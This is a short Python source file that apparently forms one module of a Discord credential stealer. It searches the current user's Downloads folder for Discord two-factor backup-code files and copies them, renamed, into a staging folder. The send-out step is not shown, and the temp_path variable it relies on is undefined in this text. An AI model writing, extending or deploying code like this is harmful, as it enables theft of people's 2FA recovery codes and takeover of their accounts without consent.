import os
import re
from shutil import copy2

class BackupCodes:
	def __init__(self):
		self.path = os.environ["HOMEPATH"]
		self.backup_code_regex= re.compile(r'discord_backup_codes.*\.txt', re.IGNORECASE)
		self.get_backup_codes()

	def get_backup_codes(self):
		backup_codes_found = False
		os.makedirs(os.path.join(temp_path, "Discord"), exist_ok=True)
		for filename in os.listdir(os.path.join(self.path, 'Downloads')):
			if self.backup_code_regex.match(filename):
				copy2(os.path.join(self.path, 'Downloads', filename), os.path.join(temp_path, "Discord", "2FA Backup Codes_" + filename))
				backup_codes_found = True
		
		if not backup_codes_found:
			with open(os.path.join(temp_path, "Discord", "No Backup Codes Found.txt"), "w") as f:
				f.write("No backup codes were found.")